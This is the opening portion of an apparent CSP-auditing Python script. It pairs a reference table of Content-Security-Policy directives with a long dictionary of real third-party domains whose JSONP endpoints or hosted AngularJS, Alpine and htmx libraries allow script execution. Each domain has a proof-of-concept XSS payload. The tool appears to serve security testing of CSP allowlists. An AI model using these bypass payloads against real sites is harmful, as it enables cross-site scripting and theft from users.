#!/usr/bin/env -S uv --quiet run --script
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests",
#     "rich",
#     "tldextract",
#     "httpx",
# ]
# ///

from __future__ import annotations

import argparse
import asyncio
import json
import re
import sys
import textwrap
import urllib.parse
from dataclasses import dataclass, field
from html.parser import HTMLParser
from string import Template
from typing import Dict, List, Optional, Sequence

import httpx
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

# ---------------------------------------
# Knowledge base
# ---------------------------------------

T_HELP: Dict[str, Dict[str, str]] = {
    # Fetch directives
    "child-src": {"text": "Workers/iframes (deprecated in CSP3; use frame-src + worker-src).", "color": "yellow"},
    "connect-src": {"text": "Restricts URLs loaded via script interfaces.", "color": "white"},
    "default-src": {"text": "Fallback for other fetch directives.", "color": "white"},
    "font-src": {"text": "Valid sources for @font-face.", "color": "white"},
    "frame-src": {"text": "Valid sources for iframes.", "color": "white"},
    "img-src": {"text": "Valid sources of images/favicons.", "color": "white"},
    "manifest-src": {"text": "Valid sources for web app manifests.", "color": "white"},
    "media-src": {"text": "Valid sources for audio/video/track.", "color": "white"},
    "object-src": {"text": "Valid sources for <object>/<embed>.", "color": "white"},
    "prefetch-src": {"text": "Valid sources to prefetch/prerender. (Deprecated)", "color": "yellow"},
    "script-src": {
        "text": "Valid sources for JavaScript and WebAssembly; fallback for script-src-elem and script-src-attr.",
        "color": "white",
    },
    "script-src-elem": {"text": "Valid sources for <script> elements only (not inline handlers).", "color": "white"},
    "script-src-attr": {"text": "Valid sources for inline JavaScript event handlers (e.g. onclick).", "color": "white"},
    "style-src": {
        "text": "Valid sources for stylesheets; fallback for style-src-elem and style-src-attr.",
        "color": "white",
    },
    "style-src-elem": {"text": 'Valid sources for <style> elements and <link rel="stylesheet">.', "color": "white"},
    "style-src-attr": {"text": "Valid sources for inline style attributes.", "color": "white"},
    "webrtc-src": {"text": "Valid sources for WebRTC.", "color": "white"},
    "worker-src": {"text": "Valid sources for Worker/SharedWorker/ServiceWorker.", "color": "white"},
    # Document directives
    "base-uri": {"text": "Restricts URLs allowed in <base>.", "color": "white"},
    "plugin-types": {"text": "Legacy plugin resource types.", "color": "yellow"},
    "sandbox": {"text": "Enables a sandbox like the <iframe> attribute.", "color": "white"},
    "disown-opener": {"text": "Ensures a resource disowns its opener (legacy).", "color": "yellow"},
    # Navigation directives
    "form-action": {"text": "Restricts form action targets.", "color": "white"},
    "frame-ancestors": {"text": "Valid parents that may embed the page.", "color": "white"},
    "navigate-to": {"text": "Restricts where a document can navigate.", "color": "white"},
    # Reporting
    "report-uri": {"text": "Legacy violation report endpoint (prefer report-to).", "color": "yellow"},
    "report-to": {"text": "Reporting API group for CSP violations.", "color": "white"},
    # Other directives
    "block-all-mixed-content": {"text": "Disallow HTTP on HTTPS pages (deprecated).", "color": "yellow"},
    "referrer": {"text": "Deprecated. Use Referrer-Policy header.", "color": "yellow"},
    "require-sri-for": {"text": "Require SRI for scripts/styles.", "color": "white"},
    "require-trusted-types-for": {
        "text": "Enforces Trusted Types at DOM XSS sinks (requires 'script').",
        "color": "white",
    },
    "trusted-types": {
        "text": "Allowlist of Trusted Types policy names to prevent DOM XSS injection.",
        "color": "white",
    },
    "upgrade-insecure-requests": {"text": "Rewrite insecure URLs to HTTPS.", "color": "white"},
    # Experimental
    "fenced-frame-src": {"text": "Valid sources for <fencedframe> elements (experimental).", "color": "yellow"},
    "inline-speculation-rules": {
        "text": "Valid sources for inline speculation-rules scripts (experimental).",
        "color": "yellow",
    },
    # Source expressions — scheme sources
    "https:": {"text": "Allow all resources served over HTTPS.", "color": "yellow"},
    "http:": {"text": "Allow all resources served over HTTP (insecure).", "color": "red"},
    "data:": {"text": "Allow data: scheme (inline base64 data).", "color": "yellow"},
    "blob:": {"text": "Allow blob: object URLs.", "color": "yellow"},
    # Source expressions — keywords
    "*": {"text": "Wildcard; allows any origin (except data:/blob: and some schemes).", "color": "dark_orange"},
    "'none'": {"text": "No sources allowed; cannot be combined with other values.", "color": "green"},
    "'self'": {"text": "Same origin only (matching scheme, host, and port).", "color": "green"},
    "'unsafe-inline'": {"text": "Allow inline scripts/styles and event handlers; defeats much of CSP.", "color": "red"},
    "'unsafe-eval'": {"text": "Allow eval() and similar dynamic code execution APIs.", "color": "red"},
    "'unsafe-hashes'": {
        "text": "Allow inline event handlers matched by hash without requiring nonces.",
        "color": "red",
    },
    "'strict-dynamic'": {
        "text": "Propagate trust from a nonced/hashed script to scripts it loads dynamically.",
        "color": "yellow",
    },
    "'wasm-unsafe-eval'": {"text": "Allow WebAssembly execution without requiring 'unsafe-eval'.", "color": "yellow"},
    "'inline-speculation-rules'": {
        "text": 'Allow inline <script type="speculationrules"> without a nonce or hash.',
        "color": "yellow",
    },
    "'trusted-types-eval'": {
        "text": "Relax eval()/Function() restrictions when Trusted Types enforcement is active.",
        "color": "yellow",
    },
    "'report-sample'": {
        "text": "Include a code sample of the violating code in CSP violation reports.",
        "color": "white",
    },
    "'nonce-'": {"text": "Allow inline script/style whose nonce attribute matches the nonce value.", "color": "green"},
    "'sha256-'": {"text": "Allow inline script/style whose SHA-256 hash matches the given value.", "color": "green"},
    "'sha384-'": {"text": "Allow inline script/style whose SHA-384 hash matches the given value.", "color": "green"},
    "'sha512-'": {"text": "Allow inline script/style whose SHA-512 hash matches the given value.", "color": "green"},
}

DEPRECATED_OR_LEGACY = {
    "child-src",
    "plugin-types",
    "disown-opener",
    "block-all-mixed-content",
    "prefetch-src",
    "referrer",
    "report-uri",
    "reflected-xss",
}

BYPASS_DOMAINS: Dict[str, Dict] = {
    "7b936.v.fwmrm.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script>'],
    },
    "a.config.skype.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>'
        ],
    },
    "a.huodong.mi.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>'],
    },
    "aax-us-east-retail-direct.amazon.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>'
        ],
    },
    "abtasty.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://abtasty.com/wp-json?_jsonp=alert"></script>'],
    },
    "accdn.lpsnmedia.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>'
        ],
    },
    "accounts.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>'],
    },
    "acs.aliexpress.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>'
        ],
    },
    "acs.youku.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>'
        ],
    },
    "adhouse.pro": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://adhouse.pro/wp-json?_jsonp=alert"></script>'],
    },
    "admatic.com.tr": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://admatic.com.tr/wp-json?_jsonp=alert"></script>'],
    },
    "admixer.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://admixer.com/wp-json?_jsonp=alert"></script>'],
    },
    "adtelligent.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://adtelligent.com/wp-json?_jsonp=alert"></script>'],
    },
    "advangelists.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://advangelists.com/wp-json?_jsonp=alert"></script>'],
    },
    "advertising.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://advertising.com/wp-json?_jsonp=alert"></script>'],
    },
    "airbnb-api.arkoselabs.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://airbnb-api.arkoselabs.com/fc/a/?callback=alert"></script></body>'],
    },
    "ajax.googleapis.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "anchor.digitalocean.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'
        ],
    },
    "api.bazaarvoice.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>'
        ],
    },
    "api.bing.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>'
        ],
    },
    "api.chartbeat.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>'],
    },
    "api.cxense.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.cxense.com/profile/user/segment?callback=alert"></script>'],
    },
    "api.dailymotion.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>'],
    },
    "api.duckduckgo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>'],
    },
    "api.flickr.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>'
        ],
    },
    "api.forismatic.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert(1)"></script>'
        ],
    },
    "api.getdrip.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>'],
    },
    "api.github.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.github.com/search/code?callback=alert"></script>'],
    },
    "api.ipify.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)//"></script>'],
    },
    "api.livechatinc.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=alert"></script>'
        ],
    },
    "api.m.jd.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>'
        ],
    },
    "api.map.baidu.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>'],
    },
    "api.mixpanel.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>'],
    },
    "api.olark.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>'
        ],
    },
    "api.pinterest.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>'],
    },
    "api.stackexchange.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>'],
    },
    "api.swiftype.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>'
        ],
    },
    "api.tumblr.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>'
        ],
    },
    "api.twitter.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.twitter.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>'
        ],
    },
    "api.usabilla.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.usabilla.com/v2/feedback/c263014c1857.config?jsonp=alert"></script>'],
    },
    "api.vk.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>'],
    },
    "api.wordpress.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>'],
    },
    "api.x.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.x.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>'
        ],
    },
    "apis.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>',
            '<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>',
        ],
    },
    "app-sjint.marketo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>'],
    },
    "app.hushly.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://app.hushly.com/runtime/visitor?callback=alert(1)//"></script>'],
    },
    "app.link": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://app.link/_r?sdk=web&callback=alert"></script>'],
    },
    "appointlet.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://appointlet.com/wp-json?_jsonp=alert"></script>'],
    },
    "apps.bdimg.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "assets.grubhub.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "assets.guim.co.uk": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>"],
    },
    "avada.io": {"risks": ["exec", "exfil"], "pocs": ['<script src="https://avada.io/wp-json?_jsonp=alert"></script>']},
    "bildirt.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://bildirt.com/wp-json?_jsonp=alert"></script>'],
    },
    "bookmark.hatenaapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>'],
    },
    "c.y.qq.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>'
        ],
    },
    "cas.criteo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert"></script>'],
    },
    "cdn.arkoselabs.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>'],
    },
    "cdn.bootcdn.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "cdn.bootcss.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "cdn.jsdelivr.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.jsdelivr.net/combine/gh/moment/moment@develop/min/moment.min.js,gh/renniepak/xss/xss.js"></script>',
            '<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>',
            '<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">',
            '<script src="https://cdn.jsdelivr.net/npm/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">',
        ],
    },
    "cdn.shopify.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>'],
    },
    "cdn.staticfile.org": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.staticfile.org/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "cdn.syncfusion.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "cdnjs.cloudflare.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script><div x-init="alert(1)">',
            '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">',
        ],
    },
    "challenges.cloudflare.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>'],
    },
    "client-api.arkoselabs.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>'],
    },
    "client.crisp.chat": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>'],
    },
    "clients1.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>'
        ],
    },
    "clients6.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>',
            '<script src="https://clients6.google.com/drive/v2internal/apps?openDrive=true&reason=301&syncType=0&errorRecovery=false&fields=kind%2CdefaultAppIds%2Citems%28kind%2Cid%2CuseByDefault%2Cname%2CopenUrlTemplate%2CprimaryMimeTypes%2CsecondaryMimeTypes%2CcreateUrl%2CcreateInFolderTemplate%2CobjectType%2CsupportsCreate%2CsupportsImport%2CsupportsMultiOpen%2CsupportsOfflineCreate%2Cinstalled%2Cauthorized%2CproductUrl%2CprimaryFileExtensions%2CsecondaryFileExtensions%2CshortDescription%2ClongDescription%2CproductId%2Cremovable%2Cicons%28iconUrl%2Csize%2Ccategory%29%2Ctype%2CchromeExtensionIds%2CrequiresAuthorizationBeforeOpenWith%2ChasDriveWideScope%2CdriveBranded%2CdriveSource%2CsupportsMobileBrowser%2CsupportsTeamDrives%2ChasGsmListing%29&languageCode=en&retryCount=0&dsNonce=cfgr2b5makyz&key=AIzaSyDLol3l87BBbfa-oQPI1b_5ymSTx8j30Ik&callback=alert(1)-1;"></script>',
        ],
    },
    "cloudinary.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cloudinary.com/wp-json?_jsonp=alert"></script>'],
    },
    "code.angularjs.org": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "commerce.coinbase.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>'],
    },
    "common.like.naver.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>'],
    },
    "connect.mail.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>'],
    },
    "connectad.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://connectad.io/wp-json?_jsonp=alert"></script>'],
    },
    "content.akamai.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'
        ],
    },
    "count-server.sharethis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>'],
    },
    "cubepile.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cubepile.com/wp-json?_jsonp=alert"></script>'],
    },
    "d.adroll.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>'
        ],
    },
    "d.la3-c2-ia5.salesforceliveagent.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=alert&version=48"></script>'
        ],
    },
    "d1xrp9zhb3ks3c.cloudfront.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "dable.io": {"risks": ["exec", "exfil"], "pocs": ['<script src="https://dable.io/wp-json?_jsonp=alert"></script>']},
    "dblp.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>'
        ],
    },
    "demandbase.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://demandbase.com/wp-json?_jsonp=alert"></script>'],
    },
    "demo.matomo.cloud": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>'
        ],
    },
    "dev.virtualearth.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>'
        ],
    },
    "documentation-resources.opendatasoft.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>'
        ],
    },
    "dpm.demdex.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://dpm.demdex.net/id?d_cb=alert"></script>'],
    },
    "dreamwater.com.tr": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://dreamwater.com.tr/wp-json?_jsonp=alert"></script>'],
    },
    "dynamic.criteo.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>'],
    },
    "elysiumwebsite.s3.amazonaws.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "eu.battle.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://eu.battle.net/support/update/json?callback=alert"></script>'],
    },
    "fast.wistia.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>'],
    },
    "firebase.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://firebase.googleapis.com/v1alpha/projects/-/apps/1:789788471140:web:7e31b15959d68ac0a51471/webConfig?callback=alert(1)-1;"></script>'
        ],
    },
    "foremedia.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://foremedia.net/wp-json?_jsonp=alert"></script>'],
    },
    "forms.hsforms.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>'
        ],
    },
    "forms.hubspot.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>'
        ],
    },
    "g2.gumgum.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://g2.gumgum.com/hbid/imp?jsonp=alert(1)"></script>'],
    },
    "geolocation.onetrust.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>'],
    },
    "gist.github.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>'
        ],
    },
    "global.apis.naver.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>'
        ],
    },
    "go.dev": {"risks": ["exec", "exfil"], "pocs": ['<script src="https://go.dev/blog/.json?jsonp=alert"></script>']},
    "go.snyk.io": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>'
        ],
    },
    "graph.facebook.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>'],
    },
    "graph.instagram.com": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://graph.instagram.com/logging_client_events?callback=alert></script>"],
    },
    "gravatar.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>'],
    },
    "gstatic.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>',
            "<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>",
        ],
    },
    "gum.criteo.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>'],
    },
    "hcaptcha.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>'],
    },
    "help.afterpay.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>'
        ],
    },
    "i.ytimg.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://i.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "iam.clients6.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://iam.clients6.google.com/v1/projects/gen-lang-client-1/serviceAccounts?callback=alert(1)"></script>'
        ],
    },
    "id.cxense.com": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://id.cxense.com/public/user/id?callback=alert></script>"],
    },
    "identitytoolkit.googleapis.com": {
